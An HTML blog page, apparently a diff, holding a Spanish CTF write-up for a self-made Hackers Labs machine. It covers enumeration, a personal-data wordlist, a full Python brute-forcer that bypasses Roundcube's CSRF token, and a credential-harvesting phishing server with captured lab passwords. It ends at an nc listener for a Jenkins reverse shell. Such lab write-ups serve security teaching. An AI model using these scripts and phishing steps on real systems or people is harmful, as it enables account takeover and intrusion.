@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | PhisermansPhriends</title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewbox="0 0 16 16" height="1.2em" width="1.2em" xmlns="http://www.w3.org/2000/svg">
+      <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">PhisermansPhriends</h2>
+          <small class="date">03 Sep 2024</small>
+          <div class="categories">
+            
+            <a href="#!" class="category">thl</a>
+            
+            <a href="#!" class="category">ctf</a>
+            
+            <a href="#!" class="category">linux</a>
+            
+            <a href="#!" class="category">profesional</a>
+            
+          </div>
+        </div>
+        <div class="content">
+<p><img src="/assets/images/phisermans/0.jpg" alt="image"></p>
+
+<p>En esta ocasión voy a resolver una máquina <strong>Linux</strong> creada por mi de dificultad <strong>Profesional</strong> para la plataforma de <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Empiezamos buscando la dirección IP del servidor en la red local:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
+10.0.2.15      08:00:27:64:b7:09       <span class="o">(</span>Unknown<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Como vemos la máquina tiene asignada la IP <strong>10.0.2.15.</strong></p>
+
+<p>Ahora vamos a realizar un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <strong>10.0.2.15:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.15
+PORT    STATE  SERVICE
+22/tcp  open   ssh
+80/tcp  open   http
+443/tcp closed https
+</code></pre></div></div>
+
+<p>Vemos que tiene los puertos <strong>22 y 80</strong> abiertos y el <strong>443</strong> <strong>cerrado</strong>. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 10.0.2.15
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 33:e6:06:ab:20:8a:bc:9a:ce:c8:75:0f:aa:64:14:62 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 65:1d:29:46:6e:f2:fe:0d:b8:0e:63:8c:0d:f5:a1:cc <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.61
+|_http-server-header: Apache/2.4.61 <span class="o">(</span>Debian<span class="o">)</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://phisermansphriends.thl/
+</code></pre></div></div>
+
+<p>Vemos que el servidor web nos redirige a un dominio, lo agregamos al fichero <strong>/etc/hosts</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'10.0.2.15 phisermansphriends.thl'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.0.2.15 phisermansphriends.thl
+</code></pre></div></div>
+
+<p>Vamos a ver que hay en esa web:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://phisermansphriends.thl
+&lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="s2">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="o">&gt;</span>
+&lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span><span class="o">&gt;</span>
+  &lt;body&gt;
+    &lt;p&gt;Estamos modificando la web. Contacto: mur.rusko@phisermansphriends.thl y admin@phisermansphriends.thl&lt;/&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>Vemos que hay 2 emails de contacto, los anotamos.</p>
+
+<p>Ahora vamos a buscar subdominios:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://10.0.2.15 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-H</span> <span class="s1">'Host: FUZZ.phisermansphriends.thl'</span> <span class="nt">-c</span> <span class="nt">-fw</span> 20
+intranet                <span class="o">[</span>Status: 403, Size: 589, Words: 309, Lines: 6, Duration: 9ms]
+mail                    <span class="o">[</span>Status: 200, Size: 5327, Words: 366, Lines: 97, Duration: 47ms]
+</code></pre></div></div>
+
+<p>Encontramos 2 subdominios, intranet (jenkins) y mail (roundcube), los añadimos al fichero <strong>hosts</strong>.</p>
+
+<p>Como tenemos 2 emails vamos a buscar por las redes sociales a ver si encontramos algún usuario que pueda pertenecer a los usuarios encontrados. En instagram encontramos el perfil de <a href="https://www.instagram.com/mur.rusko/">mur.rusko</a>.  En el post que tiene publicado podemos leer lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>🚀 ¡Hola a todos!
+
+Me presento, soy **Mur Rusko** y hoy quiero compartir con ustedes una parte muy especial de mi vida. Nací el **20 de mayo de 1990**, y desde entonces he aprendido que la pasión por lo que haces es lo que realmente impulsa el éxito.
+
+Es por eso que fundé **PhisermansPhriends**, una empresa que combina mi amor por la tecnología con mi compromiso de ofrecer soluciones innovadoras y de alta calidad. Nuestro objetivo es acompañar a nuestros clientes en cada paso de su camino hacia el éxito, brindando un servicio excepcional que va más allá de sus expectativas.
+
+Además, me gustaría presentarles a un miembro muy importante de mi equipo, mi fiel compañero **Rufo** 🐾. Él nos recuerda cada día la importancia de la lealtad, la perseverancia y la energía positiva, valores que aplicamos en cada proyecto que emprendemos.
+
+Estoy emocionado por lo que el futuro tiene reservado para **PhisermansPhriends** y estoy seguro de que juntos podemos lograr grandes cosas. 
+
+Gracias a todos los que ya forman parte de este viaje y a los que se unirán pronto. ¡Vamos por más!
+
+#emprendimiento #innovación #equipo #PhisermansPhriends #MurRusko #Rufo
+</code></pre></div></div>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Vamos a gener un diccionario con los datos. Usaremos la herramienta <strong>CUPP.</strong></p>
+
+<p>Clonamos CUPP:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/Mebus/cupp.git
+</code></pre></div></div>
+
+<p>Lo ejecutamos y rellenamos los datos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python cupp.py <span class="nt">-i</span>
+ ___________ 
+   cupp.py!                 <span class="c"># Common</span>
+      <span class="se">\ </span>                    <span class="c"># User</span>
+       <span class="se">\ </span>  ,__,             <span class="c"># Passwords</span>
+        <span class="se">\ </span> <span class="o">(</span>oo<span class="o">)</span>____         <span class="c"># Profiler</span>
+           <span class="o">(</span>__<span class="o">)</span>    <span class="o">)</span><span class="se">\ </span>  
+              <span class="o">||</span><span class="nt">--</span><span class="o">||</span> <span class="k">*</span>      <span class="o">[</span> Muris Kurgas | j0rgan@remote-exploit.org <span class="o">]</span>
+                            <span class="o">[</span> Mebus | https://github.com/Mebus/]
+
+<span class="o">[</span>+] Insert the information about the victim to make a dictionary
+<span class="o">[</span>+] If you don<span class="s1">'t know all the info, just hit enter when asked! ;)
+
+&gt; First Name: Mur
+&gt; Surname: Rusko
+&gt; Nickname: mur.rusko
+&gt; Birthdate (DDMMYYYY): 20051990
+
+&gt; Partners) name: 
+&gt; Partners) nickname: 
+&gt; Partners) birthdate (DDMMYYYY): 
+
+&gt; Child'</span>s name: 
+<span class="o">&gt;</span> Child<span class="s1">'s nickname: 
+&gt; Child'</span>s birthdate <span class="o">(</span>DDMMYYYY<span class="o">)</span>: 
+
+<span class="o">&gt;</span> Pet<span class="s1">'s name: Rufo
+&gt; Company name: PhisermansPhriends
+
+&gt; Do you want to add some key words about the victim? Y/[N]: 
+&gt; Do you want to add special chars at the end of words? Y/[N]: 
+&gt; Do you want to add some random numbers at the end of words? Y/[N]:
+&gt; Leet mode? (i.e. leet = 1337) Y/[N]: 
+
+[+] Now making a dictionary...
+[+] Sorting list and removing duplicates...
+[+] Saving dictionary to mur.txt, counting 3252 words.
+&gt; Hyperspeed Print? (Y/n) : n
+[+] Now load your pistolero with mur.txt and shoot! Good luck!
+
+</span></code></pre></div></div>
+
+<p>Si nos fijamos en las peticiones al servicio de mail, vemos que tiene un token CSRF que va cambiando con cada petición. Necesitaremos un script que realice ese cambio de token para poder realizar el ataque de fuerza bruta.</p>
+
+<p>Usamos el siguiente script:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">argparse</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">re</span>
+<span class="kn">from</span> <span class="n">multiprocessing.dummy</span> <span class="kn">import</span> <span class="n">Pool</span> <span class="k">as</span> <span class="n">ThreadPool</span>
+
+<span class="n">settings</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">threads</span><span class="sh">"</span> <span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">username</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">"</span><span class="s">mur.rusko@phisermansphriends.thl</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">url</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">"</span><span class="s">http://mail.phisermansphriends.thl/</span><span class="sh">"</span>
+<span class="p">}</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">'</span><span class="s">User-Agent</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">Accept</span><span class="sh">'</span> <span class="p">:</span> <span class="sh">'</span><span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><span class="sh">'</span>
+<span class="p">}</span>
+
+<span class="nf">if </span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">):</span>
+    <span class="n">console_mode</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Command line mode</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--threads</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-t</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Number of Threads</span><span class="sh">'</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+    <span class="nf">if </span><span class="p">(</span><span class="ow">not</span> <span class="n">args</span><span class="p">.</span><span class="n">threads</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"'</span><span class="s">--threads</span><span class="sh">'</span><span class="s"> was omitted</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+    
+    <span class="n">settings</span><span class="p">[</span><span class="sh">"</span><span class="s">threads</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">threads</span>
+
+<span class="k">def</span> <span class="nf">parse_token</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+    <span class="n">pattern</span> <span class="o">=</span> <span class="sh">'</span><span class="s">request_token</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">(.*)</span><span class="sh">"</span><span class="s">}</span><span class="sh">'</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">token</span>
+
+<span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="n">login</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">url</span><span class="sh">'</span><span class="p">]</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+        <span class="n">cookies</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">cookies</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="nf">parse_token</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">'</span><span class="s">?_task=login</span><span class="sh">'</span><span class="p">,</span>
+                          <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">_token</span><span class="sh">"</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="sh">"</span><span class="s">_task</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">_action</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">_timezone</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Europe/Madrid</span><span class="sh">"</span><span class="p">,</span>
+                                <span class="sh">"</span><span class="s">_url</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span> <span class="sh">"</span><span class="s">_user</span><span class="sh">"</span><span class="p">:</span> <span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">],</span> <span class="sh">"</span><span class="s">_pass</span><span class="sh">"</span><span class="p">:</span> <span class="n">login</span><span class="p">},</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span>
+                          <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
+
+        <span class="nf">if </span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">):</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Succes with %s:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">],</span> <span class="n">login</span><span class="p">))</span>
+            <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Code: </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="s"> - passw: </span><span class="si">{</span><span class="n">login</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">verify</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">url</span><span class="sh">'</span><span class="p">]</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="nf">parse_token</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="nf">if</span><span class="p">(</span><span class="n">token</span> <span class="o">==</span> <span class="sh">""</span><span class="p">):</span>
+            <span class="k">return</span> <span class="bp">False</span>
+        <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="n">passwords</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">mur.txt</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">%d passwords loaded</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">passwords</span><span class="p">)))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Trying with username %s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">-----------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="nf">if</span><span class="p">(</span><span class="ow">not</span> <span class="nf">verify</span><span class="p">()):</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+    <span class="n">pool</span> <span class="o">=</span> <span class="nc">ThreadPool</span><span class="p">(</span><span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">threads</span><span class="sh">'</span><span class="p">])</span>
+    <span class="n">results</span> <span class="o">=</span> <span class="n">pool</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="n">brute</span><span class="p">,</span> <span class="n">passwords</span><span class="p">)</span>
+    <span class="n">pool</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+    <span class="n">pool</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">-----------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">The End</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Lo ejecutamos usando 25 hilos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python brute.py <span class="nt">-t</span> 25
+...
+Code: 401 - passw: Mur_5901990
+Code: 401 - passw: 05199090
+Code: 401 - passw: Mur99051990
+Succes with mur.rusko@phisermansphriends.thl:MurRusko_90
+Code: 401 - passw: Rusko1990
+Code: 401 - passw: Rusko05
+...
+</code></pre></div></div>
+
+<p>Encontramos la clave de acceso de <strong>mur.rusko</strong> para el servicio de mail.</p>
+
+<p>Ahora vamos intentar hacer phishing para obtener las credenciales de <strong>intranet.phisermansphriends.thl</strong>.</p>
+
+<p>Primero ponemos a la escucha un servidor en python que acepte <strong>GET</strong> y POST:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">http.server</span> <span class="kn">import</span> <span class="n">BaseHTTPRequestHandler</span><span class="p">,</span> <span class="n">HTTPServer</span>
+
+<span class="k">class</span> <span class="nc">RequestHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">path</span> <span class="o">==</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">:</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">path</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/index.html</span><span class="sh">'</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">file_path</span> <span class="o">=</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span> <span class="o">+</span> <span class="n">self</span><span class="p">.</span><span class="n">path</span>
+            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+                <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">file_path</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">'</span><span class="s">.html</span><span class="sh">'</span><span class="p">):</span>
+                    <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">"</span><span class="s">Content-type</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">text/html</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
+                <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
+        <span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
+            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+            <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">"</span><span class="s">Content-type</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">text/plain</span><span class="sh">"</span><span class="p">)</span>
+            <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">404 Not Found</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="n">content_length</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">])</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">content_length</span><span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-type</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">text/plain</span><span class="sh">'</span><span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Received POST request with body: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">body</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">run_server</span><span class="p">():</span>
+    <span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="sh">''</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
+    <span class="n">httpd</span> <span class="o">=</span> <span class="nc">HTTPServer</span><span class="p">(</span><span class="n">server_address</span><span class="p">,</span> <span class="n">RequestHandler</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Server running on port 80...</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">httpd</span><span class="p">.</span><span class="nf">serve_forever</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">run_server</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Nos guardamos la web de login para mandar al admin</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://intranet.phisermansphriends.thl/login <span class="nt">-o</span> index.html
+</code></pre></div></div>
+
+<p>Y nos ponemos a la escucha:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python server.py
+Server running on port 80...
+</code></pre></div></div>
+
+<p>Ahora vamos a mandarle un email a admin desde el servicio de mail:</p>
+
+<p><img src="/assets/images/phisermans/1.png" alt="image"></p>
+
+<p>Ahora esperamos a que nos responda el admin:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python server.py
+Server running on port 80...
+10.0.2.15 - - <span class="o">[</span>30/Aug/2024 22:29:54] <span class="s2">"GET / HTTP/1.1"</span> 200 -
+10.0.2.15 - - <span class="o">[</span>30/Aug/2024 22:30:09] <span class="s2">"POST / HTTP/1.1"</span> 200 -
+b<span class="s1">'j_username=admin&amp;j_password=RqykJVKDt2RBjnR2q1zeIMYm&amp;from=%2F&amp;Submit='</span>
+</code></pre></div></div>
+
+<p>Nos logeamos en intranet con las credenciales que acabamos de conseguir.</p>
+
+<p><img src="/assets/images/phisermans/2.png" alt="image"></p>
+
+<p>Como sabemos, podemos obtener una reverse shell ejecutando un script escrito en Groovy desde Jenkins. En esta máquina solo podemos obtener la shell usando el puerto <strong>443</strong>, ya que el resto de puertos están cerrados.</p>
+
+<p><img src="/assets/images/phisermans/3.png" alt="image"></p>
+
+<p>Obtenemos la shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
